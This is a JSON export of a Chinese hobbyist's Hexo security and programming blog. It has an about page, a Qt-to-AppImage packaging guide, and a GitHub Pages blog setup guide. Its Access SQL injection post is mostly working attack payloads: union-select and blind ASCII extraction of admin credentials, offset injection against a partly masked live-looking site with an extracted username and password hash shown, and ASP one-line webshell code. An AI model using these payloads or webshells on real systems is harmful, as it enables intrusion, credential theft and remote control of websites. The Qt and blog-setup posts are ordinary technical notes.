{"pages":[{"title":"404","date":"05-25","updated":"05-25","comments":true,"path":"404/index.html","permalink":"https://0xfg.top/404/index.html","excerpt":"","text":""},{"title":"categories","date":"05-26","updated":"08-15","comments":true,"path":"categories/index.html","permalink":"https://0xfg.top/categories/index.html","excerpt":"","text":""},{"title":"杯具线路+","date":"05-26","updated":"10-23","comments":true,"path":"about/index.html","permalink":"https://0xfg.top/about/index.html","excerpt":"","text":"从一个一脸懵逼的小白到现在还是一个一脸懵懂的小白到现在也有几年的时间了, 期间有人问我这么做得到的回报是什么, 确实是没有什么回报虽然期间很艰辛, 但是自己却从未想过放弃, 或许就是因为自己是真心喜欢做一件事吧, 到现在已经好几年了, 也算是一步步的在走.由于刚开始学的是编程, 还是自学的, 期间真的吃了不少苦, 浪费了不少时间, 到现在也算是入门了吧但是心里早已被网络安全所吸引, 但是还是没有腾出时间学, 一直搞着编程, 很纠结, 但还是下定决心去学安全.现在学习中………… 安全小白熟悉C/C++ 网络编程 Windows Linux系统及相关系统编程…,拼命学习中… !"},{"title":"message","date":"06-19","updated":"06-19","comments":true,"path":"message/index.html","permalink":"https://0xfg.top/message/index.html","excerpt":"","text":""},{"title":"search","date":"05-25","updated":"05-25","comments":true,"path":"search/index.html","permalink":"https://0xfg.top/search/index.html","excerpt":"","text":""},{"title":"tags","date":"05-26","updated":"08-15","comments":true,"path":"tags/index.html","permalink":"https://0xfg.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Access注入","slug":"access注入","date":"08-15","updated":"08-15","comments":true,"path":"2019/08/15/access注入/","link":"","permalink":"https://0xfg.top/2019/08/15/access注入/","excerpt":"","text":"数据库文件格式及浏览access 数据库文件后缀名为: *.mdb浏览工具: 辅臣数据库浏览器 破障浏览器一个文件代表一个数据库, .mdb后缀, 表和列二级结构工具: sqlmap/啊D/名小子/穿山甲(pangolin)/萝卜头(havij) 查询格式select 1,2… from [数据库文件路径].表名 手工注入判断注入点:and 1=1 true(真) 例如: http://www.infreedom.com/zbrw.asp?lx=工装 and 1=1 正常and 1=2 false(假) 例如: http://www.infreedom.com/zbrw.asp?lx=工装 and 1=2 不正常 or 1=1 true(取后面的1=1) 例如: http://www.infreedom.com/zbrw.asp?lx=工装 or 1=1 不正常or 1=2 false(取前面的 lx=工装) 例如: http://www.infreedom.com/zbrw.asp?lx=工装 or 1=2 正常 判断数据库类型:and (select count() from msysobjects)&gt;0 判断是否为access 数据库, 如果有msysobjects这个表就是and (select count() from sysobjects)&gt;0 判断是否为sql server 数据库, 如果有sysobjects这个表就是 and exists (select * from admin) 如果返回正常就存在名称为admin表(table), 不正常就不存在and exists (select admin from admin) 如果返回正常就存在名称为admin字段, 不正常就不存在 order by … 判断有多少个字段, 要是超过总字段数量就会出错误, 可以得出有多少个字段然后在后面添加 and 1=2 union select 1,2,3,4,5,6,7,8,9 from admin 记得使它报错, and 1=2 就是报错了也可以修改前面id=-1故意使它报错 然后出来的数字可能是可以利用的字段比如出现2, 4and 1=2 union select 1,username,3,password,5,6,7,8,9 from admin这个username 和 password 一定是存在的然后出来的就是用户名和密码了 判断账户密码的长度and (select len(admin) from admin)=5 如果返回正常说明管理员账户的长度为5, 随机应变and (select len(pwd) from admin)=5 猜解管理密码长度是否为5, 随机应变 猜解管理账号的第一个数据通过判断ASCII码来判断asc 表示升序排序mid() 表示从文本字段中提取字符MID(字段名, 开始位置, 返回的字符数)top 1 表示显示第一行 and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100 返回正常说明大于, 不正常说明不大于and (select top 1 asc(mid(admin,1,1)) from admin)&gt;50 返回正常说明大于, 不正常说明不大于and (select top 1 asc(mid(admin,1,1)) from admin)=97 返回正常说明等于97, 97的ASCLL为’a’以此类推猜解管理账号的第二个数据and (select top 1 asc(mid(admin,2,1)) from admin)&gt;100猜解管理账号的第三个数据and (select top 1 asc(mid(admin,3,1)) from admin)&gt;100猜解管理密码第一个数据and (select top 1 asc(mid(password,1,1)) from admin)&gt;100 偏移注入 //前提: 页面列数要和表(例如admin表)的列数相差越多越好(比admin列数要多的页面都测试一下),偏移注入的产生主要是用来解决表名猜到, 列名猜不到的情况例如: http://www.xxxxx.cn/cp.asp?id=1129 union select 1,2,3,4,5,6,7,8,9 from admin用*号来从最后一个字段数9向前逐个删除来代替, 直到显示正常为止, *代表了admin表的所有字段 http://www.xxxxx.cn/cp.asp?id=1129 union select 1,2,3,4,5,6,7,8,* from adminhttp://www.xxxxx.cn/cp.asp?id=1129 union select 1,2,3,4,5,6,7,* from admin… 带入计算公式, 这里主要表的id是否为这个名字,名字不对会出现错误总字段数 - 当前号之前的数如: 9 - 7 = 2 5 + 2 * 2 = 9 //一级偏移union select 1,2,3,4,5,a.id,b.id, from (admin as a inner join admin as b on a.id=b.id) 3 + 2 * 3 = 9 //二级偏移union select 1,2,3,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) //测试目标: http://www.xxxxx.com/cn/products/details.asp?id=181显示字段: 2 17 4admin 14列数26 - 12 = 1426 - 14 * 1 = 12 //没有倍数,很明显不能用上面的方法//使用这种方法http://www.xxxxx.com/cn/products/details.asp?id=-181%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,admin.*%20from%20admin details.asp页面结果//26(当前页面使用的列数) - 14(admin表总列数) = 12(可插)(表名.* 从剩余的1开始插, 共插12遍), 对结果不满意可更换页面循环遍历?id=-181%20UNION%20SELECT%20admin.,2,3,4,5,6,7,8,9,10,11,12,13%20from%20admintjzdh 用户名???id=-181%20UNION%20SELECT%201,admin.,3,4,5,6,7,8,9,10,11,12,13%20from%20adminde50c87b57338773 用户密码 define001 ??3.xxxx(这个是其中一个用户名)4-12 没有好信息13.ip地址….?id=-181%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,admin.*%20from%20admin asp 后台标签插入shell, 前面要闭合“)%&gt;&lt;%eval request(“x”)%&gt;&lt;%’“%&gt;&lt;%execute request(“x”)%&gt;&lt;%’","categories":[{"name":"Access","slug":"Access","permalink":"https://0xfg.top/categories/Access/"}],"tags":[{"name":"注入","slug":"注入","permalink":"https://0xfg.top/tags/注入/"}]},{"title":"Linux QT程序打包","slug":"LinuxQT","date":"07-05","updated":"07-05","comments":true,"path":"2019/07/05/LinuxQT/","link":"","permalink":"https://0xfg.top/2019/07/05/LinuxQT/","excerpt":"","text":"//linuxdeployqt下载(程序依赖) https://github.com/probonopd/linuxdeployqt/releases //AppImage(程序打包) https://github.com/AppImage/AppImageKit/releases Kali2遇到这种问题,换ubuntu 16.04可运行 12345678910111213141516171819//配置QT环境变量,填你们的QT路径PATH=\"$HOME/bin:$HOME/.local/bin:$PATH\"PATH=/opt/Qt5.12.4/5.12.4/gcc_64/bin/:$PATHexport PATH LD_LIBRARY_PATH=/opt/Qt5.12.4/5.12.4/gcc_64/lib/:$LD_LIBRARY_PATHexport LD_LIBRARY_PATH LIBRARY_PATH=/opt/Qt5.12.4/5.12.4/gcc_64/lib/:$LIBRARY_PATHexport LIBRARY_PATH 改完可用 . xxxx profile 或者 source xxxx profile更新一下,如果没有更新则可以重新启动一次 运行qmake -v查看 //QT程序依赖库 新建文件夹,名字随便,把qt程序复制过来 运行: linuxdeployqt qtappname -appimage 出现错误,没有成功打包 Xxx.AppImage --appimage-extract //解压一个appimage文件 appimagetool-x86_64.AppImage 解压后的文件夹 //打包成.AppImage格式运行 这里我用了appimagetool-x86_64.AppImage,解开这个文件,执行上条命令,得到一个文件夹 目录结构 squashfs-root/ ├── appimagetool.desktop ├── appimagetool.svg ├── AppRun └── usr ​ ├── bin ​ │ ├── appimagetool ​ │ ├── AppRun ​ │ ├── desktop-file-validate ​ │ └── zsyncmake ​ ├── lib ​ │ ├── appimagekit ​ │ │ └── mksquashfs ​ │ ├── libffi.so.5 ​ │ ├── libgio-2.0.so ​ │ ├── libgio-2.0.so.0 ​ │ ├── libgio-2.0.so.0.4000.0 ​ │ ├── libglib-2.0.so ​ │ ├── libglib-2.0.so.0 ​ │ ├── libglib-2.0.so.0.4000.0 ​ │ ├── libgmodule-2.0.so ​ │ ├── libgmodule-2.0.so.0 ​ │ ├── libgmodule-2.0.so.0.4000.0 ​ │ ├── libgobject-2.0.so ​ │ ├── libgobject-2.0.so.0 ​ │ ├── libgobject-2.0.so.0.4000.0 ​ │ ├── libgthread-2.0.so ​ │ ├── libgthread-2.0.so.0 ​ │ └── libgthread-2.0.so.0.4000.0 ​ └── share ​ ├── applications ​ │ └── appimagetool.desktop ​ ├── icons ​ │ └── hicolor ​ │ └── scalable ​ │ └── apps ​ │ └── appimagetool.svg ​ └── metainfo ​ └── appimagetool.appdata.xml 11 directories, 27 files //修改成我们我自己的程序,然后打包 ![](https://gitee.com/InfinitelyFreedom/InfinitelyFreedom/raw/master/imgs/blogpic/LinuxQT/lqt7.jpg) 执行命令打包我们的发布程序 appimagetool-x86_64.AppImage too.AppDir/ test.AppImage 完成 发布程序文件夹目录结构 tree too.AppDir/ too.AppDir/ ├── appimagetool.desktop ├── appimagetool.svg ├── AppRun └── usr ​ ├── bin ​ │ ├── qt.conf ​ │ └── untitled ​ ├── doc ​ │ ├── libboost-filesystem1.58.0 ​ │ │ └── copyright ​ │ ├── libboost-system1.58.0 ​ │ │ └── copyright ​ │ ├── libcapnp-0.5.3 ​ │ │ └── copyright ​ │ ├── libdbus-1-3 ​ │ │ └── copyright ​ │ ├── libffi6 ​ │ │ └── copyright ​ │ ├── libgbm1 ​ │ │ └── copyright ​ │ ├── libgcrypt20 ​ │ │ └── copyright ​ │ ├── libglib2.0-0 ​ │ │ └── copyright ​ │ ├── liblzma5 ​ │ │ └── copyright ​ │ ├── libmirclient9 ​ │ │ └── copyright ​ │ ├── libmircommon7 ​ │ │ └── copyright ​ │ ├── libmircore1 ​ │ │ └── copyright ​ │ ├── libmirprotobuf3 ​ │ │ └── copyright ​ │ ├── libpcre3 ​ │ │ └── copyright ​ │ ├── libpng12-0 ​ │ │ └── copyright ​ │ ├── libprotobuf-lite9v5 ​ │ │ └── copyright ​ │ ├── libselinux1 ​ │ │ └── copyright ​ │ ├── libsystemd0 ​ │ │ └── copyright ​ │ ├── libwayland-client0 ​ │ │ └── copyright ​ │ ├── libwayland-server0 ​ │ │ └── copyright ​ │ ├── libx11-xcb1 ​ │ │ └── copyright ​ │ ├── libxau6 ​ │ │ └── copyright ​ │ ├── libxcb-glx0 ​ │ │ └── copyright ​ │ ├── libxcb-present0 ​ │ │ └── copyright ​ │ ├── libxcb-sync1 ​ │ │ └── copyright ​ │ ├── libxcb-xfixes0 ​ │ │ └── copyright ​ │ ├── libxcb-xkb1 ​ │ │ └── copyright ​ │ ├── libxdamage1 ​ │ │ └── copyright ​ │ ├── libxdmcp6 ​ │ │ └── copyright ​ │ ├── libxext6 ​ │ │ └── copyright ​ │ ├── libxfixes3 ​ │ │ └── copyright ​ │ ├── libxkbcommon0 ​ │ │ └── copyright ​ │ ├── libxkbcommon-x11-0 ​ │ │ └── copyright ​ │ ├── libxrender1 ​ │ │ └── copyright ​ │ ├── libxshmfence1 ​ │ │ └── copyright ​ │ └── libxxf86vm1 ​ │ └── copyright ​ ├── lib ​ │ ├── appimagekit ​ │ │ └── mksquashfs ​ │ ├── libboost_filesystem.so.1.58.0 ​ │ ├── libboost_system.so.1.58.0 ​ │ ├── libcapnp-0.5.3.so ​ │ ├── libdbus-1.so.3 ​ │ ├── libffi.so.5 ​ │ ├── libffi.so.6 ​ │ ├── libgbm.so.1 ​ │ ├── libgcrypt.so.20 ​ │ ├── libgio-2.0.so ​ │ ├── libgio-2.0.so.0 ​ │ ├── libgio-2.0.so.0.4000.0 ​ │ ├── libglib-2.0.so ​ │ ├── libglib-2.0.so.0 ​ │ ├── libglib-2.0.so.0.4000.0 ​ │ ├── libgmodule-2.0.so ​ │ ├── libgmodule-2.0.so.0 ​ │ ├── libgmodule-2.0.so.0.4000.0 ​ │ ├── libgobject-2.0.so ​ │ ├── libgobject-2.0.so.0 ​ │ ├── libgobject-2.0.so.0.4000.0 ​ │ ├── libgthread-2.0.so ​ │ ├── libgthread-2.0.so.0 ​ │ ├── libgthread-2.0.so.0.4000.0 ​ │ ├── libicudata.so.56 ​ │ ├── libicui18n.so.56 ​ │ ├── libicuuc.so.56 ​ │ ├── libkj-0.5.3.so ​ │ ├── liblzma.so.5 ​ │ ├── libmirclient.so.9 ​ │ ├── libmircommon.so.7 ​ │ ├── libmircore.so.1 ​ │ ├── libmirprotobuf.so.3 ​ │ ├── libpcre.so.3 ​ │ ├── libpng12.so.0 ​ │ ├── libprotobuf-lite.so.9 ​ │ ├── libQt5Core.so.5 ​ │ ├── libQt5DBus.so.5 ​ │ ├── libQt5Gui.so.5 ​ │ ├── libQt5Network.so.5 ​ │ ├── libQt5Qml.so.5 ​ │ ├── libQt5Quick.so.5 ​ │ ├── libQt5Svg.so.5 ​ │ ├── libQt5VirtualKeyboard.so.5 ​ │ ├── libQt5Widgets.so.5 ​ │ ├── libQt5XcbQpa.so.5 ​ │ ├── libselinux.so.1 ​ │ ├── libsystemd.so.0 ​ │ ├── libwayland-client.so.0 ​ │ ├── libwayland-server.so.0 ​ │ ├── libX11-xcb.so.1 ​ │ ├── libXau.so.6 ​ │ ├── libxcb-glx.so.0 ​ │ ├── libxcb-present.so.0 ​ │ ├── libxcb-sync.so.1 ​ │ ├── libxcb-xfixes.so.0 ​ │ ├── libxcb-xkb.so.1 ​ │ ├── libXdamage.so.1 ​ │ ├── libXdmcp.so.6 ​ │ ├── libXext.so.6 ​ │ ├── libXfixes.so.3 ​ │ ├── libxkbcommon.so.0 ​ │ ├── libxkbcommon-x11.so.0 ​ │ ├── libXrender.so.1 ​ │ ├── libxshmfence.so.1 ​ │ └── libXxf86vm.so.1 ​ ├── plugins ​ │ ├── bearer ​ │ │ ├── libqconnmanbearer.so ​ │ │ ├── libqgenericbearer.so ​ │ │ └── libqnmbearer.so ​ │ ├── iconengines ​ │ │ └── libqsvgicon.so ​ │ ├── imageformats ​ │ │ ├── libqgif.so ​ │ │ ├── libqicns.so ​ │ │ ├── libqico.so ​ │ │ ├── libqjpeg.so ​ │ │ ├── libqsvg.so ​ │ │ ├── libqtga.so ​ │ │ ├── libqtiff.so ​ │ │ ├── libqwbmp.so ​ │ │ └── libqwebp.so ​ │ ├── platforminputcontexts ​ │ │ ├── libcomposeplatforminputcontextplugin.so ​ │ │ ├── libibusplatforminputcontextplugin.so ​ │ │ └── libqtvirtualkeyboardplugin.so ​ │ ├── platforms ​ │ │ └── libqxcb.so ​ │ └── xcbglintegrations ​ │ ├── libqxcb-egl-integration.so ​ │ └── libqxcb-glx-integration.so ​ ├── share ​ │ ├── applications ​ │ │ └── appimagetool.desktop ​ │ ├── icons ​ │ │ └── hicolor ​ │ │ └── scalable ​ │ │ └── apps ​ │ │ └── appimagetool.svg ​ │ └── metainfo ​ │ └── appimagetool.appdata.xml ​ └── translations ​ ├── qt_ar.qm ​ ├── qt_bg.qm ​ ├── qt_ca.qm ​ ├── qt_cs.qm ​ ├── qt_da.qm ​ ├── qt_de.qm ​ ├── qt_en.qm ​ ├── qt_es.qm ​ ├── qt_fi.qm ​ ├── qt_fr.qm ​ ├── qt_gd.qm ​ ├── qt_he.qm ​ ├── qt_hu.qm ​ ├── qt_it.qm ​ ├── qt_ja.qm ​ ├── qt_ko.qm ​ ├── qt_lv.qm ​ ├── qt_pl.qm ​ ├── qt_ru.qm ​ ├── qt_sk.qm ​ ├── qt_uk.qm ​ └── qt_zh_TW.qm 56 directories, 151 files //这里模仿了其他appimage应用的目录结构,达成了目的","categories":[{"name":"QT","slug":"QT","permalink":"https://0xfg.top/categories/QT/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://0xfg.top/tags/Linux/"}]},{"title":"博客入坑记","slug":"FirstBlog","date":"05-24","updated":"06-17","comments":true,"path":"2019/05/24/FirstBlog/","link":"","permalink":"https://0xfg.top/2019/05/24/FirstBlog/","excerpt":"","text":"博客从入坑到崩溃…中间省略n个… 博客搭建准备环境Node.js: 选择对应系统下载安装Git: 选择对应系统下载安装安装完成之后就在自己喜欢位置新建一个文件夹作为博客的目录,我这里是myblogwin键+r键 运行 cmd 命令, 进到博客文件夹里面运行 npm install hexo-cli -g完成之后输入git-bash运行git, 在git里面运行hexo init初始化Hexo初始化完成后会生成相关文件: 当前目录下的 _config.yml 网站相关配置文件 当前目录下的 themes/主题文件夹/_config.yml 网站主题配置文件打开 cmd 进入你初始化的网站根目录下运行 hexo server开启服务浏览器访问网址： http://localhost:4000/ 或者 http://127.0.0.1:4000/本地搭建完成…. GitHub注册GitHubgithub账号注册 注册时用户名要仔细想好, 因为这是影响博客地址的地方, 博客地址一般为: ** https://你的用户名.github.io/ ** 注册完成后新建一个库 库名为: ** 你的用户名.github.io 注意大小写,最好和用户名一样** cmd 里面执行安装 npm install hexo-deployer-git –save,完成后执行** ssh-keygen -t rsa -C “邮箱地址” 生成github的密钥, 然后到 c:\\Users\\你的电脑用户名.ssh ** 这个目录里面(注意这个目录是隐藏)打开id_rsa.pub 这个文件, 复制里面所有内容到github上面打开网站目录修改 __config.yml配置文件, 找到下面进行修改deploy: type: git repo: git@github.com:你的Github账号名称/你的Github账号名称.github.io.git branch: master 下面开始上传网站到github上面** cmd 进入你的博客网站的根目录里面 注意别搞错路径 ** 1hexo clean //先清理 1$ hexo -g //生成静态文件 ** 注意第一次操作可能会弹框需要你登录github账号 ** 1$ hexo -d //上传到你的github仓库上面 浏览器访问网址： https://你的Github账号名称.github.io 访问你的博客 博客域名注册阿里云并购买域名, 完成一系列验证后, 进入域名管理, 选择域名解析, 解析设置添加如下两条解析, 记录值为自己的github.io的地址ping yourgithubname.github.io然后在 你的博客仓库名字.github.io里面的settings(仓库) 里面设置你自己的域名, 保存后会生成一个CNAME文件, 里面保存着你的域名. 完成后就可以用你自己的域名访问github.io了","categories":[{"name":"博客","slug":"博客","permalink":"https://0xfg.top/categories/博客/"}],"tags":[{"name":"踩坑记","slug":"踩坑记","permalink":"https://0xfg.top/tags/踩坑记/"}]}]}